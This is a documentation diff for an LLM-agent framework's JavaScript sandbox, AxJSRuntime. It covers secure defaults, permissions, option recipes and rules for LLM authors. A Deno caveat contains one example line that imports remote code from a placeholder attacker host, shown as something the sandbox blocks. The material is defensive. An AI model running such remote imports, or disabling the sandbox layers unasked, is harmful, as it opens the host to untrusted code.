@@ -610,6 +610,78 @@ console.log(topCustomers);
 
 Reason: turn 2 reuses `customers` from the persistent runtime. `Live Runtime State` or summaries may change how turn 1 is shown in the prompt, but they do not remove the value from the runtime session.
 
+## AxJSRuntime Security
+
+Default `new AxJSRuntime()` is hardened: no network, no fs, no child_process, `import()` blocked, intrinsics frozen, `ShadowRealm` locked to `undefined`, worker IPC locked in browser/Deno, and on Node 20+ the OS Permission Model auto-engages (using `--permission` on Node 23.5+ or `--experimental-permission` on Node 20–23.4) as a second defense layer. You do not need to configure anything to get the strict profile — opt in only to the capability the user actually asked for.
+
+**Permission enum** (`AxJSRuntimePermission`):
+`NETWORK`, `STORAGE`, `CODE_LOADING`, `COMMUNICATION`, `TIMING`, `WORKERS`, `FILESYSTEM` (new), `CHILD_PROCESS` (new).
+
+**Options quick reference** (all defaults shown are secure):
+
+| Option | Default | Effect |
+|---|---|---|
+| `blockDynamicImport` | `true` | Blocks `import()` + Function/eval constructor shims. |
+| `allowedModules` | `[]` | Whitelist of specifiers permitted when `blockDynamicImport` is on. |
+| `freezeIntrinsics` | `true` | Freezes `Object`/`Array`/`Promise`/etc. prototypes. |
+| `blockShadowRealm` | `true` | Locks `globalThis.ShadowRealm` to `undefined`. |
+| `lockWorkerIPC` | `true` | Locks `self.postMessage`/`onmessage` in browser/Deno workers. |
+| `preventGlobalThisExtensions` | `false` | Opt-in; breaks top-level `var/let/const` persistence across turns. |
+| `useNodePermissionModel` | `'auto'` | Engages Node Permission Model on Node 20+ (`--permission` on 23.5+, `--experimental-permission` on 20–23.4); skips on older runtimes. |
+| `nodePermissionAllowlist` | `undefined` | Fine-grained `{ fsRead, fsWrite, childProcess, addons, wasi }`. |
+| `resourceLimits` | `undefined` | `{ maxOldGenerationSizeMb, maxYoungGenerationSizeMb, codeRangeSizeMb, stackSizeMb }`. |
+| `allowDenoRemoteImport` | `false` | On Deno, controls whether `NETWORK` also grants remote module loading. |
+| `allowUnsafeNodeHostAccess` | `false` | Exposes `process`/`require` in Node — trusted-code only. |
+
+**Recipes:**
+
+Maximum security (default):
+```ts
+new AxJSRuntime();
+```
+
+Allow fetch only:
+```ts
+new AxJSRuntime({ permissions: [AxJSRuntimePermission.NETWORK] });
+```
+
+Allow fs scoped to one directory:
+```ts
+new AxJSRuntime({
+  permissions: [AxJSRuntimePermission.FILESYSTEM],
+  allowedModules: ['node:fs', 'node:fs/promises', 'node:path'],
+  useNodePermissionModel: 'auto',
+  nodePermissionAllowlist: {
+    fsRead: ['/app/data'],
+    fsWrite: ['/app/data'],
+  },
+});
+```
+
+Trust the code (explicit opt-out of every layer):
+```ts
+new AxJSRuntime({
+  permissions: Object.values(AxJSRuntimePermission),
+  allowUnsafeNodeHostAccess: true,
+  blockDynamicImport: false,
+  blockShadowRealm: false,
+  freezeIntrinsics: false,
+  lockWorkerIPC: false,
+  useNodePermissionModel: false,
+});
+```
+
+**Rules for the LLM author:**
+
+- Default to `new AxJSRuntime()` with no options unless the user asked for a specific capability.
+- When the user asks for `fetch`, add `permissions: [AxJSRuntimePermission.NETWORK]` — do not disable `blockDynamicImport` as a workaround.
+- When the user asks for `fs`, add both `permissions: [AxJSRuntimePermission.FILESYSTEM]` AND `allowedModules: ['node:fs', 'node:fs/promises', 'node:path']`. Scope with `nodePermissionAllowlist` when the user names a directory.
+- Do not disable `freezeIntrinsics`, `blockShadowRealm`, or `lockWorkerIPC` unless the user explicitly asks — these do not trade off against any legitimate RLM use case.
+- Treat `allowUnsafeNodeHostAccess: true` as a red flag; only use it when the user is authoring trusted code in their own process.
+- `preventGlobalThisExtensions: true` breaks top-level `var/let/const` persistence across turns — never set it for stdout-mode RLM where persistence is load-bearing (see `RLM Actor Code Rules`).
+
+**Deno caveat:** `blockDynamicImport` is a no-op in Deno (no `node:vm`); the defense there is the worker permission sandbox applied by default. When `NETWORK` is granted on Deno, `import` is set to `false` by default so `await import('https://attacker.example/evil.ts')` is blocked at the runtime level — pass `allowDenoRemoteImport: true` only if remote module loading is genuinely required.
+
 ## RLM Test Harness
 
 Use `agent.test(code, contextFieldValues?, options?)` when the user wants to validate JavaScript snippets against the actual AxAgent runtime environment without running the full Actor/Responder loop.
@@ -1216,6 +1288,23 @@ agentIdentity?: {
 - `namespaces` matches exact discovery namespaces from successful `discoverFunctions(...)` lookups and starts affecting model choice on the next actor turn.
 - Consecutive error turns reset after a successful non-error turn and when checkpoint summarization refreshes to a new fingerprint.
 - `maxSubAgentCalls` is a shared delegated-call budget across the entire run.
+
+### `AxJSRuntime` options (cross-reference)
+
+Constructor options for `new AxJSRuntime(opts)`. All defaults are secure — see `## AxJSRuntime Security` for full detail and recipes.
+
+- `permissions?: readonly AxJSRuntimePermission[]` — default `[]`; opt in capabilities (NETWORK, FILESYSTEM, CHILD_PROCESS, WORKERS, STORAGE, CODE_LOADING, COMMUNICATION, TIMING).
+- `blockDynamicImport?: boolean` — default `true`.
+- `allowedModules?: readonly string[]` — default `[]`.
+- `freezeIntrinsics?: boolean` — default `true`.
+- `blockShadowRealm?: boolean` — default `true`.
+- `lockWorkerIPC?: boolean` — default `true`.
+- `preventGlobalThisExtensions?: boolean` — default `false` (opt-in; breaks persistence).
+- `useNodePermissionModel?: boolean | 'auto'` — default `'auto'`.
+- `nodePermissionAllowlist?: { fsRead?; fsWrite?; childProcess?; addons?; wasi? }`.
+- `resourceLimits?: { maxOldGenerationSizeMb?; maxYoungGenerationSizeMb?; codeRangeSizeMb?; stackSizeMb? }`.
+- `allowDenoRemoteImport?: boolean` — default `false`.
+- `allowUnsafeNodeHostAccess?: boolean` — default `false`.
 
 ## Observability: getChatLog() and getUsage()
 
